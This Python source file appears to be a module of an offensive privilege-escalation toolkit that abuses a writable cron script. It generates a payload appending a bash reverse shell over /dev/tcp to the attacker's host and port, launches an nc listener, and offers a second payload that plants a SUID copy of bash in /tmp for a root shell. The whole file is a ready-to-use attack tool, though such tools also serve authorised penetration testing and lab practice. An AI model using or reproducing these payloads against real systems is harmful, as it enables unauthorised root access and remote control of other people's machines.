import subprocess

from core import attacker


#
# Colors
#
RESET  = "\033[0m"
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
BLUE   = "\033[34m"
CYAN   = "\033[36m"
BOLD   = "\033[1m"


def copy_clipboard(text):
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except Exception:
        return False


def start_listener(port):
    try:
        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"nc -lvnp {port}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    except Exception:
        return False


def verify(path):
    print()
    print(f"{BOLD}Verify{RESET}")
    print("-" * 50)
    print()

    print(f"ls -l {path}")
    print("cat /etc/crontab")
    print("systemctl list-timers")

    print()


def reverse_shell(path):
    ip = attacker.get_ip()

    print()

    host = input(f"LHOST [{ip}]: ").strip() or ip
    port = input("LPORT [4444]: ").strip() or "4444"

    start_listener(port)

    payload = (
        f"echo 'bash -i >& /dev/tcp/{host}/{port} 0>&1' >> {path}"
    )

    copied = copy_clipboard(payload)

    print()
    print(f"{GREEN}Reverse shell payload{RESET}")
    print("-" * 50)
    print(payload)
    print()

    if copied:
        print(f"{GREEN}[+] Copied to clipboard{RESET}")

    print(f"{GREEN}[+] Listener started on {port}{RESET}")
    print()
    print("Wait for cron to execute.")
    print()


def suid_bash(path):
    payload = (
        f"echo 'cp /bin/bash /tmp/rootbash' >> {path}\n"
        f"echo 'chmod +s /tmp/rootbash' >> {path}"
    )

    copied = copy_clipboard(payload)

    print()
    print(f"{GREEN}SUID Bash Payload{RESET}")
    print("-" * 50)
    print(payload)
    print()

    if copied:
        print(f"{GREEN}[+] Copied to clipboard{RESET}")

    print()
    print("After cron executes:")
    print()
    print("/tmp/rootbash -p")
    print()


def menu(path):
    while True:

        print(f"{BOLD}Writable Cron Job{RESET}")
        print("-" * 50)
        print()

        print(f"Target : {CYAN}{path}{RESET}")
        print()

        print("[1] Reverse Shell")
        print("[2] SUID Bash")
        print("[3] Exit")
        print()

        choice = input("Select > ").strip()

        if choice in ("", "1"):
            reverse_shell(path)
            return

        elif choice == "2":
            suid_bash(path)
            return

        elif choice == "3":
            return


def run(data, cred, args):

    #
    # Get path from command line
    #
    path = None

    if hasattr(args, "extra") and args.extra:
        path = args.extra[0]

    while not path:
        path = input("Writable cron script > ").strip()

    verify(path)
    menu(path)